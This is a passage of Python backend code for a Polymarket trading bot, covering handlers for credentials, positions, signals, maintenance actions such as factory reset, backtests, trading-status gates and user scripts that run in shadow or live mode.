        polymarket_api._creds_derived = False  # type: ignore[attr-defined]
    except Exception:
        pass

    active_env = env or polymarket_auth.get_env()
    global _sig_type_reconciled
    _sig_type_reconciled = False
    try:
        trader._balance_cache.pop(active_env, None)  # type: ignore[attr-defined]
    except Exception:
        pass
    if active_env in (None, polymarket_auth.get_env()):
        try:
            STATE.auth_ok = (
                await _establish_auth()
                if polymarket_auth.credentials_present(active_env) else False
            )
            await emit_event("backend:authChanged", {"authOk": STATE.auth_ok})
        except Exception as e:
            logger.warning(f"auth re-verify after API credential change failed: {e}")
        try:
            if STATE.active_run_id:
                with db.get_db() as conn:
                    db.end_bot_run(conn, STATE.active_run_id)
                STATE.active_run_id = 0
            if STATE.auth_ok:
                cents, port = await trader.refresh_balance(STATE.cfg, force=True)
                env_now = polymarket_auth.get_env()
                with db.get_db() as conn:
                    stats = db.aggregate_stats(conn, env_now)
                    STATE.active_run_id = db.start_bot_run(
                        conn, env=env_now,
                        cash_usd=cents / 100.0, portfolio_usd=port / 100.0,
                        lifetime_trades=int(stats.get("total_opened") or 0),
                        lifetime_wins=int(stats.get("wins") or 0),
                        lifetime_losses=int(stats.get("losses") or 0),
                    )
                logger.info(
                    f"Bot run #{STATE.active_run_id} started after API credential change "
                    f"(env={env_now})"
                )
        except Exception as e:
            logger.warning(f"could not roll bot_run on wallet change: {e}")

    status = polymarket_auth.credentials_status_all()
    await emit_event("credentials:changed", status)
    return status


async def _h_clearCredentials(p: dict) -> dict:
    p = p or {}
    env = p.get("env")
    await polymarket_api.close_clients()
    polymarket_auth.clear_credentials(env)
    if env in (None, polymarket_auth.get_env()):
        STATE.auth_ok = False
        await emit_event("backend:authChanged", {"authOk": False})
    status = polymarket_auth.credentials_status_all()
    await emit_event("credentials:changed", status)
    return status


async def _h_credentialStatus(_p: dict) -> dict:
    return polymarket_auth.credentials_status_all()


_sig_type_reconciled = False


async def _reconcile_signature_type() -> None:
    global _sig_type_reconciled
    if _sig_type_reconciled:
        return
    try:
        funder = polymarket_auth.get_funder()
        if not funder:
            _sig_type_reconciled = True
            return
        stored = polymarket_auth.get_signature_type()
        detected = await polymarket_api.detect_wallet_signature_type()
        if detected is None:
            return
        if int(detected) != int(stored):
            polymarket_auth.set_wallet_meta(funder=funder, signature_type=int(detected))
            logger.warning(
                f"[wallet] repaired signatureType {stored}→{detected} for deposit {funder} "
                f"(a previous version stored the wrong scheme; orders were being rejected)"
            )
        _sig_type_reconciled = True
    except Exception as e:
        logger.debug(f"[wallet] signature-type reconcile skipped: {e}")


async def _establish_auth(retries: int = 3) -> bool:
    last_exc = None
    for attempt in range(1, retries + 1):
        try:
            polymarket_auth.prime_credentials(sync_time=True)
            await polymarket_api.ensure_api_creds()
        except Exception as e:
            last_exc = e
            logger.warning(f"auth verify attempt {attempt}/{retries} failed: {e}")
            if attempt < retries:
                await asyncio.sleep(1.5 * attempt)
            continue
        await _reconcile_signature_type()
        try:
            await polymarket_api.get_balance()
        except Exception as be:
            logger.debug(f"auth verify: balance warm failed (non-fatal): {be}")
        return True
    logger.warning(f"auth verify failed after {retries} attempts: {last_exc}")
    return False


async def _h_testCredentials(p: dict) -> dict:
    p = p or {}
    target_env = polymarket_auth.get_env()
    if not polymarket_auth.credentials_present(target_env):
        raise RuntimeError("Polymarket US API credentials not set")

    polymarket_auth.reset_credential_cache()
    polymarket_auth.prime_credentials(sync_time=True)
    ready = await polymarket_api.check_trading_ready()
    if not ready.get("address"):
        STATE.auth_ok = False
        await emit_event("backend:authChanged", {"authOk": False})
        raise RuntimeError(
            (ready.get("issues") or ["could not connect to Polymarket"])[0]
        )
    STATE.auth_ok = True
    await emit_event("backend:authChanged", {"authOk": True})
    for msg in ready.get("issues", []):
        logger.warning(f"trading-readiness: {msg}")
    return {
        "env": target_env,
        "balanceUsd": ready.get("balanceUsd", 0.0),
        "ready": ready.get("ok", False),
        "approvalsOk": ready.get("approvalsOk"),
        "signerOk": ready.get("signerOk"),
        "issues": ready.get("issues", []),
        "address": ready.get("address", ""),
    }


async def _h_account(_p: dict) -> dict:
    return await _build_account_snapshot()


async def _h_pnlSeries(p: dict) -> list:
    hours = int((p or {}).get("sinceHours", 168))
    env = polymarket_auth.get_env()
    with db.get_db() as conn:
        rows = db.get_pnl_snapshots(conn, since_hours=hours, env=env)
    return [
        {
            "at": _iso_utc(r["at"]),
            "cashUsd": float(r["cash_usd"] or 0),
            "portfolioUsd": float(r["portfolio_usd"] or 0),
            "totalUsd": float(r["total_usd"] or 0),
            "realizedPnlUsd": float(r["realized_pnl_usd"] or 0),
            "openPositions": int(r["open_positions"] or 0),
        }
        for r in rows
    ]


async def _h_positions(p: dict) -> list:
    f = p or {}
    status = f.get("status")
    resolved = f.get("resolved")
    src = f.get("signalSource")
    limit = int(f.get("limit") or 500)

    sql = "SELECT * FROM bot_positions WHERE 1=1"
    args: list = []
    if status:
        placeholders = ",".join("?" for _ in status)
        sql += f" AND status IN ({placeholders})"
        args.extend(status)
    if resolved is not None:
        sql += " AND resolved = ?"
        args.append(1 if resolved else 0)
    if src:
        sql += " AND signal_source = ?"
        args.append(src)
    sql += " ORDER BY created_at DESC LIMIT ?"
    args.append(limit)

    with db.get_db() as conn:
        rows = conn.execute(sql, args).fetchall()
    return [_position_row_to_js(dict(r)) for r in rows]


async def _h_signals(p: dict) -> list:
    f = p or {}
    src = f.get("source")
    min_conf = float(f.get("minConfidence") or 0)
    limit = int(f.get("limit") or 200)

    out: list[dict] = []
    env = polymarket_auth.get_env()
    with db.get_db() as conn:
        if src in (None, "whale"):
            rows = conn.execute(
                """SELECT * FROM whale_trades
                   WHERE confidence >= ?
                   ORDER BY created_at DESC LIMIT ?""",
                (min_conf, limit),
            ).fetchall()
            seen = db.already_traded_signal_ids(conn, "whale", env)
            for r in rows:
                d = dict(r)
                out.append(_signal_row_to_js(d, "whale", int(d["id"]) in seen))
        if src in (None, "momentum"):
            rows = conn.execute(
                """SELECT * FROM alerts
                   WHERE confidence >= ?
                   ORDER BY created_at DESC LIMIT ?""",
                (min_conf, limit),
            ).fetchall()
            seen = db.already_traded_signal_ids(conn, "momentum", env)
            for r in rows:
                d = dict(r)
                out.append(_signal_row_to_js(d, "momentum", int(d["id"]) in seen))
    out.sort(key=lambda s: s["createdAt"], reverse=True)
    return out[:limit]


async def _h_scannerStats(_p: dict) -> dict:
    with db.get_db() as conn:
        markets = conn.execute(
            "SELECT COUNT(*) FROM markets WHERE status IN ('active','open')"
        ).fetchone()[0]
        wt = conn.execute(
            """SELECT COUNT(*) AS total,
                      SUM(CASE WHEN discord_sent=1 THEN 1 ELSE 0 END) AS sent,
                      SUM(CASE WHEN resolved=1 THEN 1 ELSE 0 END) AS resolved,
                      SUM(CASE WHEN outcome_correct=1 THEN 1 ELSE 0 END) AS wins
               FROM whale_trades"""
        ).fetchone()
        al = conn.execute(
            """SELECT COUNT(*) AS total,
                      SUM(CASE WHEN discord_sent=1 THEN 1 ELSE 0 END) AS sent,
                      SUM(CASE WHEN resolved=1 THEN 1 ELSE 0 END) AS resolved,
                      SUM(CASE WHEN outcome_correct=1 THEN 1 ELSE 0 END) AS wins
               FROM alerts"""
        ).fetchone()

    def wr(d) -> dict:
        total = int(d["total"] or 0)
        resolved = int(d["resolved"] or 0)
        wins = int(d["wins"] or 0)
        return {
            "total": total,
            "sent": int(d["sent"] or 0),
            "resolved": resolved,
            "winRate": (wins / resolved * 100.0) if resolved else 0.0,
        }

    return {
        "whales": wr(wt),
        "momentum": wr(al),
        "marketsTracked": int(markets or 0),
        "lastWhaleScanAt": STATE.last_whale_scan_at,
        "lastMomentumScanAt": STATE.last_momentum_scan_at,
        "lastTradeScanAt": STATE.last_trade_scan_at,
    }


async def _h_cancelAllOpen(_p: dict) -> dict:
    if not STATE.auth_ok:
        raise RuntimeError("not authenticated")
    n = await trader.cancel_all_open()
    return {"canceled": n}


async def _h_flatten(_p: dict) -> dict:
    if not STATE.auth_ok:
        raise RuntimeError("not authenticated")
    r = await trader.flatten_open_positions(STATE.cfg)
    try:
        await emit_event("backend:reconciled", {"flattened": r["sold"]})
    except Exception:
        pass
    return {"closed": r["canceled"] + r["sold"], **r}


async def _h_runOnce(p: dict) -> dict:
    action = (p or {}).get("action")
    if action == 'recoverOrder':
        import polymarket_api
        evidence = await polymarket_api.recover_order(p['localOrderId'], p['exchangeOrderId'])
        await trader.poll_open_orders(STATE.cfg)
        return {'summary': 'Order linked and reconciled', 'state': evidence['state']}
    if action == "syncMarkets":
        cnt = await scanner.sync_markets(max_pages=10)
        return {"summary": f"Synced {cnt} markets"}
    if action == "pollOrders":
        upd = await trader.poll_open_orders(STATE.cfg)
        return {"summary": f"Polled, {len(upd)} updates"}
    if action == "resolveAll":
        rp = await trader.mark_resolved_positions(STATE.cfg)
        ra = await scanner.resolve_alerts_from_markets()
        rw = await scanner.resolve_whales_from_markets()
        return {"summary": f"Positions:{len(rp)} alerts:{ra} whales:{rw}"}
    if action == "reconcilePositions":
        s, changed = await trader.reconcile_positions_with_polymarket()
        for row in changed:
            await emit_event("position:update", _position_row_to_js(row))
        return {
            "summary": (
                f"Reconciled — rescued {s.get('rescued', 0)}, "
                f"resurrected {s.get('resurrected', 0)}, "
                f"imported {s.get('imported_unknowns', 0)}"
            ),
        }
    if action == "syncPositions":
        polled = await trader.poll_open_orders(STATE.cfg)
        s, changed = await trader.reconcile_positions_with_polymarket()
        exited = await trader.detect_external_exits(STATE.cfg)
        emitted: set = set()
        for row in [*polled, *changed, *exited]:
            try:
                js = _position_row_to_js(row)
            except Exception:
                continue
            if js.get("id") in emitted:
                continue
            emitted.add(js.get("id"))
            await emit_event("position:update", js)
        try:
            await trader.refresh_balance(STATE.cfg, force=True)
            await emit_event("account:update", await _build_account_snapshot())
        except Exception as e:
            logger.debug(f"syncPositions balance refresh failed: {e}")
        return {
            "summary": (
                f"Synced — {len(polled)} order update(s), "
                f"rescued {s.get('rescued', 0)}, resurrected {s.get('resurrected', 0)}, "
                f"imported {s.get('imported_unknowns', 0)}, "
                f"closed {len(exited)} exited externally"
            ),
        }
    if action == "recomputePnl":
        s = await trader.recompute_pnl_from_polymarket()
        return {
            "summary": f"Re-resolved {s['recomputed']} of {s['cleared']} positions from Polymarket",
        }
    if action == "reconcileFills":
        s = await trader.reconcile_fills_from_polymarket()
        return {
            "summary": (
                f"Reconciled {s['fills_reconciled']} orders from Polymarket fills, "
                f"re-resolved {s['pnl_recomputed']} of {s['pnl_cleared']}"
            ),
        }
    if action == "auditPnl":
        s = await trader.audit_pnl(200)
        worst_lines = []
        for x in s.get("samples", [])[:8]:
            worst_lines.append(
                f"  {x['ticker']} {x['direction']}: stored ${x['stored_pnl']:+.2f} → fresh ${x['fresh_pnl']:+.2f} (Δ ${x['delta']:+.2f})"
            )
        msg = (
            f"Audited {s['checked']} resolved positions: {s['flagged']} flagged. "
            f"Sum stored=${s['sum_stored_pnl']:+.2f} vs fresh=${s['sum_recompute_pnl']:+.2f} "
            f"(Δ ${s['delta']:+.2f})"
        )
        if worst_lines:
            msg += "\n" + "\n".join(worst_lines)
        return {"summary": msg, "audit": s}
    raise ValueError(f"unknown action: {action}")


async def _h_pause(p: dict) -> dict:
    STATE.paused = bool((p or {}).get("paused", False))
    return {"paused": STATE.paused}


def _run_row_to_js(r: dict) -> dict:
    return {
        "id": int(r["id"]),
        "network": r.get("network") or "mainnet",
        "startedAt": _iso_utc(r.get("started_at")) or "",
        "endedAt": _iso_utc(r.get("ended_at")),
        "startCashUsd": float(r.get("start_cash_usd") or 0),
        "startPortfolioUsd": float(r.get("start_portfolio_usd") or 0),
        "startTotalUsd": float(r.get("start_total_usd") or 0),
        "endCashUsd": (
            float(r["end_cash_usd"])
            if r.get("end_cash_usd") is not None else None
        ),
        "endPortfolioUsd": (
            float(r["end_portfolio_usd"])
            if r.get("end_portfolio_usd") is not None else None
        ),
        "endTotalUsd": (
            float(r["end_total_usd"])
            if r.get("end_total_usd") is not None else None
        ),
        "pnlUsd": float(r.get("pnl_usd") or 0),
        "tradesOpened": int(r.get("trades_opened") or 0),
        "tradesWon": int(r.get("trades_won") or 0),
        "tradesLost": int(r.get("trades_lost") or 0),
        "isActive": r.get("ended_at") is None,
    }


async def _h_botRuns(p: dict) -> dict:
    env = (p or {}).get("env")
    limit = int((p or {}).get("limit") or 100)
    with db.get_db() as conn:
        rows = db.get_recent_runs(conn, env=env, limit=limit)
        active = (
            db.get_active_run(conn, polymarket_auth.get_env())
            if STATE.active_run_id else None
        )
    return {
        "runs": [_run_row_to_js(r) for r in rows],
        "activeRunId": STATE.active_run_id,
        "activeRun": _run_row_to_js(active) if active else None,
    }


async def _h_shutdown(_p: dict) -> dict:
    t = asyncio.create_task(_shutdown())
    _bg_tasks.add(t)
    t.add_done_callback(_bg_tasks.discard)
    return {"shutting_down": True}


async def _h_factoryReset(_p: dict) -> dict:
    logger.warning("factory reset: STARTING — pausing trader loop")
    await _stop_loop()

    if STATE.active_run_id:
        try:
            with db.get_db() as conn:
                db.end_bot_run(conn, STATE.active_run_id)
        except Exception as e:
            logger.warning(f"factoryReset: end_bot_run: {e}")
        STATE.active_run_id = 0

    summary = await asyncio.to_thread(db.factory_reset)
    deleted_total = sum(
        v for k, v in summary.items()
        if not k.startswith("_") and isinstance(v, int) and v > 0
    )
    if summary.get("_errors"):
        logger.error(
            f"factory reset: PARTIAL — deleted {deleted_total} rows, "
            f"errors={summary['_errors']}"
        )
    else:
        logger.warning(
            f"factory reset: COMPLETE — deleted {deleted_total} rows "
            f"({summary})"
        )

    STATE.last_whale_scan_at = ""
    STATE.last_momentum_scan_at = ""
    STATE.last_trade_scan_at = ""

    if STATE.auth_ok:
        try:
            cents, port = await trader.refresh_balance(STATE.cfg, force=True)
            env = polymarket_auth.get_env()
            with db.get_db() as conn:
                stats = db.aggregate_stats(conn, env)
                STATE.active_run_id = db.start_bot_run(
                    conn, env=env,
                    cash_usd=cents / 100.0,
                    portfolio_usd=port / 100.0,
                    lifetime_trades=int(stats.get("total_opened") or 0),
                    lifetime_wins=int(stats.get("wins") or 0),
                    lifetime_losses=int(stats.get("losses") or 0),
                )
            logger.info(
                f"Bot run #{STATE.active_run_id} started after factory reset "
                f"(env={env}, "
                f"start_total=${(cents + port) / 100:.2f})"
            )
        except Exception as e:
            logger.warning(f"factoryReset: post-reset run start: {e}")

    await emit_event("data:reset", {"summary": summary})
    snap = await _build_account_snapshot()
    await emit_event("account:update", snap)

    await _start_loop()
    logger.info("factory reset: trader loop resumed")

    return {"ok": True, "deleted": summary}


async def _h_clearHistory(_p: dict) -> dict:
    logger.warning("clear history: STARTING — pausing trader loop")
    await _stop_loop()

    if STATE.active_run_id:
        try:
            with db.get_db() as conn:
                db.end_bot_run(conn, STATE.active_run_id)
        except Exception as e:
            logger.warning(f"clearHistory: end_bot_run: {e}")
        STATE.active_run_id = 0

    summary = await asyncio.to_thread(db.clear_trade_history)
    deleted_total = sum(
        v for k, v in summary.items()
        if not k.startswith("_") and isinstance(v, int) and v > 0
    )
    if summary.get("_errors"):
        logger.error(
            f"clear history: PARTIAL — deleted {deleted_total} rows, "
            f"errors={summary['_errors']}"
        )
    else:
        logger.warning(
            f"clear history: COMPLETE — deleted {deleted_total} rows "
            f"({summary})"
        )

    if STATE.auth_ok:
        try:
            cents, port = await trader.refresh_balance(STATE.cfg, force=True)
            env = polymarket_auth.get_env()
            with db.get_db() as conn:
                stats = db.aggregate_stats(conn, env)
                STATE.active_run_id = db.start_bot_run(
                    conn, env=env,
                    cash_usd=cents / 100.0,
                    portfolio_usd=port / 100.0,
                    lifetime_trades=int(stats.get("total_opened") or 0),
                    lifetime_wins=int(stats.get("wins") or 0),
                    lifetime_losses=int(stats.get("losses") or 0),
                )
            logger.info(
                f"Bot run #{STATE.active_run_id} started after clear history "
                f"(env={env}, start_total=${(cents + port) / 100:.2f})"
            )
        except Exception as e:
            logger.warning(f"clearHistory: post-clear run start: {e}")

    await emit_event("data:reset", {"summary": summary})
    snap = await _build_account_snapshot()
    await emit_event("account:update", snap)

    await _start_loop()
    logger.info("clear history: trader loop resumed")

    return {"ok": True, "deleted": summary}


async def _h_crypto15m(_p: dict) -> dict:
    return await crypto15m.snapshot(STATE.cfg)


async def _h_crypto15mStatus(_p: dict) -> dict:
    return await crypto15m_trader.status(STATE.cfg, authed=STATE.auth_ok)


async def _h_c15_history(p: dict) -> dict:
    limit = min(1000, max(1, int((p or {}).get("limit") or 200)))
    env = polymarket_auth.get_env()
    with db.get_db() as conn:
        rows = db.recent_crypto15m_resolved(conn, env, limit=limit)
    return {"rows": [crypto15m_trader._pos_to_js(r) for r in rows]}


async def _h_c15_backtest(p: dict) -> dict:
    import replay
    cfg = dict(STATE.cfg or {})
    patch = (p or {}).get("config") or {}
    if isinstance(patch, dict):
        cfg.update(patch)
    cfg = merge_with_defaults(cfg)
    since = int((p or {}).get("sinceDays") or 60)
    env = str((p or {}).get("env") or polymarket_auth.get_env())
    return await asyncio.to_thread(replay.replay, cfg, env=env, since_days=since)


async def _h_c15_parlay_generate(p: dict) -> dict:
    import parlay_generator
    p = p or {}
    sched = await asyncio.to_thread(
        lambda: parlay_generator.generate(
            env=str(p.get("env") or polymarket_auth.get_env()),
            interval=str(p.get("interval") or "15m"),
            since_days=int(p.get("sinceDays") or 60),
            holdout_days=int(p.get("holdoutDays") or parlay_generator.DEFAULT_HOLDOUT_DAYS),
            min_win_rate=float(p.get("minWinRate") or parlay_generator.DEFAULT_MIN_WIN_RATE),
            min_trades=int(p.get("minTrades") or parlay_generator.DEFAULT_MIN_TRADES),
        )
    )
    saved = p.get("save", True)
    if saved:
        parlay_generator.save_schedule(sched)
    return {"schedule": sched, "saved": bool(saved)}


async def _h_c15_parlay_status(_p: dict) -> dict:
    armed, sched = crypto15m_trader.parlay_state(force=True)
    return {"armed": armed, "schedule": sched}


async def _h_c15_parlay_arm(p: dict) -> dict:
    import parlay_generator
    try:
        parlay_generator.set_armed(bool((p or {}).get("armed")))
    except ValueError as e:
        armed, sched = crypto15m_trader.parlay_state(force=True)
        return {"armed": armed, "hasSchedule": bool(sched), "error": str(e)}
    armed, sched = crypto15m_trader.parlay_state(force=True)
    return {"armed": armed, "hasSchedule": bool(sched)}


async def _h_main_backtest(p: dict) -> dict:
    import replay
    cfg = dict(STATE.cfg or {})
    patch = (p or {}).get("config") or {}
    if isinstance(patch, dict):
        cfg.update(patch)
    cfg = merge_with_defaults(cfg)
    since = int((p or {}).get("sinceDays") or 60)
    return await asyncio.to_thread(replay.replay_main, cfg, since_days=since)


async def _h_collection_stats(_p: dict) -> dict:
    env = polymarket_auth.get_env()

    def _q() -> dict:
        with db.get_db() as conn:
            c15 = conn.execute(
                """SELECT COUNT(*) n, SUM(resolved) r, MIN(observed_at) a,
                          MAX(observed_at) b
                   FROM crypto15m_signals WHERE network=?""", (env,)
            ).fetchone()
            ticks = conn.execute(
                "SELECT COUNT(*) FROM crypto15m_ticks WHERE network=?", (env,)
            ).fetchone()[0]
            recent_c15 = conn.execute(
                """SELECT ticker, asset, favorite, favorite_price, up_won,
                          resolved, close_time
                   FROM crypto15m_signals WHERE network=?
                   ORDER BY id DESC LIMIT 12""", (env,)
            ).fetchall()
            wh = conn.execute(
                """SELECT COUNT(*) n, SUM(resolved) r, MIN(created_at) a,
                          MAX(created_at) b FROM whale_trades"""
            ).fetchone()
            al = conn.execute(
                """SELECT COUNT(*) n, SUM(resolved) r, MIN(created_at) a,
                          MAX(created_at) b FROM alerts"""
            ).fetchone()
            cats = conn.execute(
                """SELECT category, COUNT(*) n FROM whale_trades
                   GROUP BY category ORDER BY n DESC LIMIT 6"""
            ).fetchall()
            recent_main = conn.execute(
                """SELECT ticker, category, taker_side, price, dollar_value,
                          outcome_correct, resolved, created_at
                   FROM whale_trades ORDER BY id DESC LIMIT 12"""
            ).fetchall()
        return {
            "c15": {
                "windows": int(c15["n"] or 0),
                "resolved": int(c15["r"] or 0),
                "ticks": int(ticks or 0),
                "firstAt": c15["a"], "lastAt": c15["b"],
                "recent": [dict(r) for r in recent_c15],
            },
            "main": {
                "whales": int(wh["n"] or 0), "whalesResolved": int(wh["r"] or 0),
                "alerts": int(al["n"] or 0), "alertsResolved": int(al["r"] or 0),
                "firstAt": wh["a"] or al["a"], "lastAt": wh["b"] or al["b"],
                "topCategories": [dict(r) for r in cats],
                "recent": [dict(r) for r in recent_main],
            },
            "collecting": {
                "c15": bool((STATE.cfg or {}).get("crypto15m_record_signals", True)),
                "main": True,
            },
        }
    return await asyncio.to_thread(_q)


async def _h_export_research(_p: dict) -> dict:
    import csv

    def _dump() -> dict:
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
        out_dir = os.path.join(os.path.dirname(str(db.db_path())), "exports", stamp)
        os.makedirs(out_dir, exist_ok=True)
        tables = ["crypto15m_signals", "crypto15m_ticks", "crypto15m_positions",
                  "whale_trades", "alerts"]
        files = []
        with db.get_db() as conn:
            for t in tables:
                rows = conn.execute(f"SELECT * FROM {t}").fetchall()
                path = os.path.join(out_dir, f"{t}.csv")
                with open(path, "w", newline="", encoding="utf-8") as f:
                    if rows:
                        w = csv.DictWriter(f, fieldnames=list(dict(rows[0]).keys()))
                        w.writeheader()
                        for r in rows:
                            w.writerow(dict(r))
                    else:
                        f.write("")
                files.append(path)
        return {"dir": out_dir, "files": files}
    return await asyncio.to_thread(_dump)


async def _h_trading_status(_p: dict) -> dict:
    cfg = STATE.cfg
    env = trader.get_env()
    main: list[dict] = []

    def gate(gid: str, label: str, ok: bool, reason: str = "", off: bool = False) -> None:
        main.append({
            "id": gid, "label": label,
            "state": "off" if off else ("ok" if ok else "blocked"),
            "reason": reason if not ok else "",
        })

    gate("paused", "Engine not paused", not STATE.paused, "paused by user")
    gate("auth", "Polymarket US API", bool(STATE.auth_ok), "auth failed — check API credentials")
    enabled = bool(cfg.get("enable_trading"))
    paper = bool(cfg.get("main_paper_trading")) and not enabled
    mode = "live" if enabled else ("paper" if paper else "paused")
    gate("master", "Main strategy running", enabled or paper,
         "strategy is paused", off=not (enabled or paper))
    if enabled:
        try:
            blocked, why = trader._is_blocked_by_daily_risk(cfg, env)
            gate("dailyRisk", "Daily stop/take-profit", not blocked, why or "")
        except Exception:
            gate("dailyRisk", "Daily stop/take-profit", True)
    else:
        gate("dailyRisk", "Live daily stop/take-profit", True, off=True)
    try:
        hblocked, hwhy = trader._is_blocked_by_trading_hours(cfg)
        gate("hours", "Trading hours", not hblocked, hwhy or "")
    except Exception:
        gate("hours", "Trading hours", True)
    if enabled:
        try:
            lok, lwhy = trader.can_open_new_entries(env)
            gate("walletLock", "Account not traded elsewhere", lok, lwhy or "")
        except Exception:
            gate("walletLock", "Account not traded elsewhere", True)
    else:
        gate("walletLock", "Live account lock", True, off=True)
    lc = dict(getattr(trader, "last_cycle", {}) or {})
    if lc.get("skipReason"):
        gate("cycle", "Last scan cycle", False, str(lc.get("skipReason")))
    else:
        gate("cycle", "Last scan cycle", True)

    cycle_reason = str(lc.get("skipReason") or "")
    hard_blocks = [
        g for g in main if g["state"] == "blocked" and g["id"] != "cycle"
    ]
    if mode == "paused":
        main_state, main_summary = "paused", "The main strategy is paused."
    elif hard_blocks:
        main_state = "blocked"
        main_summary = hard_blocks[0].get("reason") or hard_blocks[0]["label"]
    elif cycle_reason:
        if cycle_reason.lower().startswith("no candidates"):
            main_state, main_summary = "waiting", "No fresh signal currently qualifies."
        else:
            main_state, main_summary = "blocked", cycle_reason
    elif int(lc.get("candidates") or 0) == 0:
        main_state, main_summary = "scanning", "Scanning for a qualifying signal."
    elif int(lc.get("placed") or 0) == 0:
        main_state, main_summary = "waiting", "Candidates were checked; none qualified."
    else:
        main_state = "scanning"
        label = "practice trade" if paper else "order"
        main_summary = f"Last scan created {int(lc.get('placed') or 0)} {label}(s)."

    with db.get_db() as conn:
        paper_stats = db.paper_account_stats(
            conn, env, float(cfg.get("main_paper_bankroll_usd", 1000.0)),
        )

    c15 = await crypto15m_trader.status(cfg, authed=STATE.auth_ok)
    return {
        "main": main,
        "mainMode": mode,
        "mainState": main_state,
        "mainSummary": main_summary,
        "mainLastCycleAt": lc.get("at"),
        "mainFilterCounts": lc.get("filterCounts") or {},
        "mainCandidates": lc.get("candidates") or 0,
        "mainPlaced": lc.get("placed") or 0,
        "mainPaper": {
            "bankrollUsd": paper_stats["bankroll_usd"],
            "availableUsd": paper_stats["available_usd"],
            "open": paper_stats["open"],
            "resolved": paper_stats["resolved"],
            "wins": paper_stats["wins"],
            "losses": paper_stats["losses"],
            "pnlUsd": paper_stats["pnl_usd"],
        },
        "c15": {
            "enabled": c15.get("enabled"),
            "live": c15.get("trading"),
            "authed": bool(STATE.auth_ok),
            "env": env,
            "blockReasons": c15.get("blockReasons") or {},
        },
    }


async def _h_copyStatus(_p: dict) -> dict:
    return await copy_trader.status(STATE.cfg, authed=STATE.auth_ok)


def _sanitize_script_code(raw: Any) -> str:
    return str(raw or "").encode("utf-8", "replace").decode("utf-8", "replace")


def _script_status_js(r: dict) -> dict:
    import script_engine
    sid = str(r.get("id") or "")
    st = script_engine.status_for(sid)
    cfg = STATE.cfg or {}
    enabled = bool(r.get("enabled"))
    shadow = bool(r.get("dry_run", 1))

    if not enabled:
        state, detail = "off", "Not enabled — flip Enabled to start it."
    elif not STATE.auth_ok:
        state, detail = ("blocked",
                         "No API credentials connected — open the API page.")
    elif not shadow and not cfg.get("scripts_live_enabled"):
        state, detail = ("blocked",
                         'Armed for real orders, but the "Scripts live" master '
                         "switch is off — it is not running. Turn the master "
                         "switch on, or set this script back to Shadow.")
    elif st.get("gate") == "over_cap":
        state, detail = ("blocked",
                         f"Past the {int(cfg.get('script_max_enabled') or 10)}-script "
                         "concurrency cap — disable another script or raise the cap.")
    elif st.get("gate") == "compile_failed":
        state, detail = "error", "Its code failed to load — see the error above."
    elif not st.get("ticks"):
        state, detail = ("starting",
                         "Enabled and waiting for its first tick (~5s).")
    else:
        ticks = int(st.get("ticks") or 0)
        orders = int(st.get("orders") or 0)
        noun = "shadow order" if shadow else "order"
        detail = (f"Running in {'shadow' if shadow else 'LIVE'} — {ticks:,} tick(s), "
                  f"{orders:,} {noun}{'' if orders == 1 else 's'}")
        if st.get("lastIntentAt"):
            detail += f", last signal {_iso_utc(st['lastIntentAt'])}"
        else:
            detail += ", no setup found yet (a selective strategy can go days)"
        state = "running"
    return {
        "state": state, "detail": detail,
        "ticks": int(st.get("ticks") or 0),
        "intents": int(st.get("intents") or 0),
        "orders": int(st.get("orders") or 0),
        "lastTickAt": st.get("lastTickAt"),
        "lastIntentAt": st.get("lastIntentAt"),
        "lastOrderAt": st.get("lastOrderAt"),
    }


def _script_row_js(r: dict, stats: dict | None = None,
                   shadow_stats: dict | None = None) -> dict:
    import script_audit
    import script_backtest
    code = _sanitize_script_code(r.get("code"))
    return {
        "id": r.get("id"), "name": r.get("name"),
        "description": r.get("description") or "",
        "code": code,
        "enabled": bool(r.get("enabled")),
        "assets": script_backtest.parse_asset_scope(r.get("assets")),
        "audit": script_audit.audit(code),
        "status": _script_status_js(r),
        "dryRun": bool(r.get("dry_run", 1)),
        "shadowStats": (shadow_stats or {}).get(str(r.get("id"))) or None,
        "notes": r.get("notes") or "",
        "lastError": r.get("last_error"),
        "lastErrorAt": _iso_utc(r.get("last_error_at")),
        "createdAt": _iso_utc(r.get("created_at")),
        "updatedAt": _iso_utc(r.get("updated_at")),
        "stats": (stats or {}).get(str(r.get("id"))) or None,
    }


async def _h_scripts_list(_p: dict) -> dict:
    env = polymarket_auth.get_env()
    with db.get_db() as conn:
        rows = db.list_user_scripts(conn)
        stats = db.script_live_stats(conn, env)
        shadow = db.script_shadow_stats(conn, env)
    return {"scripts": [_script_row_js(r, stats, shadow) for r in rows]}


async def _h_script_set_dry_run(p: dict) -> dict:
    sid = str(p.get("id") or "")
    dry = bool(p.get("dryRun"))
    with db.get_db() as conn:
        row = db.get_user_script(conn, sid)
        if not row:
            raise ValueError("script not found")
        if not dry:
            errors = script_sandbox.validate(str(row.get("code") or ""))
            if errors:
                raise ValueError("script does not validate: " + errors[0])
        db.update_user_script(conn, sid, dry_run=1 if dry else 0)
        row = db.get_user_script(conn, sid)
        stats = db.script_live_stats(conn, polymarket_auth.get_env())
        shadow = db.script_shadow_stats(conn, polymarket_auth.get_env())
    logger.warning(
        f"[scripts] {row.get('name')} ({sid[:8]}) is now "
        f"{'SHADOW (no real orders)' if dry else 'ARMED FOR REAL ORDERS'}")
    return {"script": _script_row_js(row or {}, stats, shadow)}


async def _h_script_shadow_orders(p: dict) -> dict:
    with db.get_db() as conn:
        rows = db.list_script_shadow(conn, str(p.get("id") or ""),
                                     int(p.get("limit") or 200))
    return {"orders": [{
        "id": r.get("id"), "source": r.get("source"),
        "asset": r.get("asset"), "ticker": r.get("ticker"),
        "side": r.get("side"), "contracts": r.get("contracts"),
        "entryCents": r.get("entry_cents"), "orderType": r.get("order_type"),
        "reason": r.get("reason") or "", "refused": bool(r.get("refused")),
        "note": r.get("note") or "",
        "resolved": bool(r.get("resolved")),
        "won": (None if r.get("outcome_correct") is None
                else bool(r.get("outcome_correct"))),
        "pnlUsd": r.get("pnl_usd"),
        "at": _iso_utc(r.get("created_at")),
    } for r in rows]}


async def _h_script_save(p: dict) -> dict:
    sid = str(p.get("id") or "").strip() or os.urandom(8).hex()
    code = _sanitize_script_code(p.get("code"))
    meta = script_sandbox.parse_header(code)
    name = str(p.get("name") or "").strip() or meta.get("name") or "Untitled script"
    desc = str(p.get("description") or "").strip() or meta.get("description") or ""
    import script_audit
    with db.get_db() as conn:
        existing = db.get_user_script(conn, sid)
        errors = script_sandbox.validate(code)
        audit = script_audit.audit(code)
